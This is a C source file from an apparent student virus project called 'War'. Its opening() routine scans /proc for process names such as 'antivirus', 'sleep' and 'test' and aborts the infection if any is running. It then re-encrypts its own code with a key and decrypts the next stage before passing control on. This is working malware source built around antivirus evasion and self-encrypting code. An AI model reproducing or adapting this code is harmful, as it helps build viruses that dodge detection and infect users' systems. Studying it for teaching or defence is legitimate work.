/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   opening.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/27 12:20:54 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/08 15:40:30 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

/*
  Opening() iterate thought every entry in /proc in order to found antivirus proccess
  Look at needle variable to remove or add proccess you want to find.
  if the process is found then War abort as soon as possible.
*/

void	opening(t_data *data)
{

#ifdef DEBUG
	char de[] = "opening\t0\n";
	data->context == true ?	de[8] = 49 : 0;
	_write(1, de, _strlen(de));
#endif

	int				fd[3];
	int				limit;
	char			buf[BUFF_SIZE] = {0};
	char			target[9] = "/status";
	char			path[PATH_MAX] = "/proc/";
	char			prog[PROG_INFO] = {0};
	char			needle[PROG_ENTRY][16] = { "sleep", "antivirus", "test" };
	linux_dirent64	*curr = NULL;

	data->context = false;
	if ((fd[0] = _open(path, O_RDONLY, 0000)) < 0)
		goto next;

	while ((limit = _getdents64(fd[0], (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		for (register int i = 0 ; i < limit ; i += curr->d_reclen)
		{
			curr = (struct linux_dirent64 *)(buf + i);
			int len = _strlen(curr->d_name);
			if (check_name(curr->d_name, len) == true)
			{

				_memcpy(path + 6, curr->d_name, len);
				path[6 + len] = '\0';
				if ((fd[1] = _open(path, O_RDONLY, 0000)) < 0)
				{
					_close(fd[0]);
					goto next;
				}
				_memcpy(path + (6 + len), target, 9);
				if ((fd[2] = _open(path, O_RDONLY, 0000)) < 0)
				{
					_close(fd[1]);
					goto next;
				}

				if (_read(fd[2], prog, PROG_INFO) > 0)
				{
					for (register int j = 0 ; j < PROG_ENTRY ; j++)
					{
						int k = 6;
						while ((prog[k] == ' ' || prog[k] == '\t') && prog[k] != '\0')
							k++;
						if (_strncmp(needle[j], &prog[k], _strlen(needle[j])) == 0)
						{
							_close(fd[2]);
							_close(fd[1]);
							goto next;
						}
					}
				}

				_close(fd[2]);
				_close(fd[1]);
			}
		}
	}
	_close(fd[0]);
	data->context = true;

next:

	update_two(&data->key, (char*)opening, (size_t)war - (size_t)opening);
	revert_two(&data->key, (char*)war, (size_t)locate - (size_t)war);
	war(data);
}
